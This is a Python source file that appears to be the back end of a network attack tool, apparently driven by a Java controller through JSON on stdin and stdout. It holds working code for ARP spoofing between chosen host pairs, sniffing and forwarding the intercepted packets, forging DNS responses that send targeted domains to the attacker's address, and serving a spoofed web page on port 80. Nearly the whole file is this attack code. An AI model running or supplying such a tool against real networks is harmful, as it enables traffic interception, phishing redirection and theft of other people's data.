import sys
import json
import threading
import time
from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
import copy
from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler
from functools import partial

targets = []
is_running = True
lock = threading.Lock()

dns_targets = []

attacker_mac = get_if_hwaddr(conf.iface)
attacker_ip = get_if_addr(conf.iface)
# Cache to store resolved IP-MAC pairs
mac_cache = {}


def log_info(msg):
    print(json.dumps({"type": "info", "info": msg}), flush=True)


def log_error(msg):
    print(json.dumps({"type": "error", "error": msg}), flush=True)


def send_packet_info(packet):
    if packet.haslayer(Ether):
        src = packet[Ether].src.lower()
        dst = packet[Ether].dst.lower()
        with lock:
            for ip1, ip2 in targets:
                mac1 = mac_cache.get(ip1)
                mac2 = mac_cache.get(ip2)

                if mac1 is None or mac2 is None:
                    # Skip pairs with missing MACs
                    continue

                # Check if destination mac address is the user's mac address:
                if dst == attacker_mac:

                    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
                        domain = packet[DNSQR].qname.decode().rstrip('.').lower()
                        if any(domain.endswith(target) for target in dns_targets):
                            newpacket = copy.deepcopy(packet)
                            ip = IP(src=newpacket[IP].dst, dst=newpacket[IP].src)  # DNS server IP to client IP
                            udp = UDP(sport=53, dport=newpacket[UDP].sport)   # Sport = 53 (DNS), Dport = client's source port

                            dns = DNS(
                                id=newpacket[DNS].id,         # Transaction ID (must match the query)
                                qr=1,              # This is a response
                                aa=1,              # Authoritative Answer
                                qdcount=1,
                                ancount=1,
                                qd=newpacket[DNS].qd,
                                an=DNSRR(rrname=domain, ttl=300, rdata=attacker_ip)
                            )

                            newpacket = ip / udp / dns
                            send(newpacket, iface=conf.iface, verbose=False)

                            break
                        else:

                            if src == mac1:
                                print_package_in_json(packet)  # Let java know of the packet
                                redirect_package(mac1, packet)
                                break

                            elif src == mac2:
                                print_package_in_json(packet)  # Let java know of the packet
                                redirect_package(mac2, packet)
                                break
                    else:
                        if src == mac1:
                            print_package_in_json(packet)  # Let java know of the packet
                            redirect_package(mac2, packet)
                            break
                        elif src == mac2:
                            print_package_in_json(packet)  # Let java know of the packet
                            redirect_package(mac1, packet)
                            break


# Creates a new packet with the attacker's mac address
# as source and the specified destination as destination
def redirect_package(destination, packet):
    new_packet = copy.deepcopy(packet)
    new_packet[Ether].src = attacker_mac.lower()
    new_packet[Ether].dst = destination
    sendp(new_packet, iface=conf.iface, verbose=False)


# Nicely divides up the packet and writes it in json format and lets java know
def print_package_in_json(packet):
    info = {
        "type": "packet",
        "summary": packet.summary(),
    }
    print(json.dumps(info), flush=True)


def spoof_loop():
    while is_running:
        with lock:
            for ip1, ip2 in targets:
                spoof(ip1, ip2)
                spoof(ip2, ip1)
        time.sleep(2)


def get_mac(ip):
    """Retrieve MAC address for an IP address, using cache if available."""
    if ip not in mac_cache:
        # Resolve MAC address if not cached
        mac = getmacbyip(ip).lower()
        if mac:
            mac_cache[ip] = mac
        else:
            log_error(f"Failed to resolve MAC address for IP: {ip}")
            return None
    return mac_cache[ip]


def spoof(ip1, ip2):
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    if mac1 is None or mac2 is None:
        log_error(f"Failed to resolve MAC address for IPs: {ip1} or {ip2}")
        return

    # Create the ARP spoof packet
    packet = ARP(op=2, pdst=ip1, psrc=ip2, hwsrc=attacker_mac, hwdst=mac1)

    # Send the spoofed packet
    send(packet, verbose=False)

    # Also spoof in the opposite direction
    packet = ARP(op=2, pdst=ip2, psrc=ip1, hwsrc=attacker_mac, hwdst=mac2)
    send(packet, verbose=False)


def sniff_thread():
    sniff(prn=send_packet_info, store=0)


def handle_command(command):
    global is_running
    try:
        data = json.loads(command)
        action = data.get("action")

        if action == "add_target":
            ip1, ip2 = data["ip1"], data["ip2"]
            with lock:
                if (ip1, ip2) not in targets:
                    targets.append((ip1, ip2))
                    log_info(f"Added spoofing pair: {ip1} <-> {ip2}")

        elif action == "remove_target":
            ip1, ip2 = data["ip1"], data["ip2"]
            with lock:
                if (ip1, ip2) in targets:
                    targets.remove((ip1, ip2))
                    log_info(f"Removed spoofing pair: {ip1} <-> {ip2}")

        elif action == "shutdown":
            is_running = False
            log_info("Shutting down spoofer...")

    except Exception as e:
        log_error(f"Failed to handle command: {str(e)}")

def ssl_spoof_handler(request, client_address, server):
    class Handler(SimpleHTTPRequestHandler):
        def do_GET(self):
            host = self.headers.get('Host', 'unknown')
            log_info(f"Intercepted GET for: {host}{self.path}")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f"""
            <html>
            <head><title>Fake Page</title></head>
            <body>
                <h1>This is a spoofed version of {host}</h1>
                <p>All traffic is intercepted for lab testing.</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode())

        def log_message(self, format, *args):
            return  # Silence default logging

    return Handler(request, client_address, server)


def run_spoofed_http_server():
    server_address = (attacker_ip, 80)
    handler = partial(ssl_spoof_handler)
    httpd = HTTPServer(server_address, handler)
    log_info(f"Starting spoofed HTTP server on {attacker_ip}:80")
    httpd.serve_forever()


def main():
    log_info("Spoofer started.")

    threading.Thread(target=spoof_loop, daemon=True).start()
    threading.Thread(target=sniff_thread, daemon=True).start()
    threading.Thread(target=run_spoofed_http_server, daemon=True).start()

    for line in sys.stdin:
        handle_command(line.strip())
        if not is_running:
            break

    log_info("Spoofer exited.")


if __name__ == "__main__":
    main()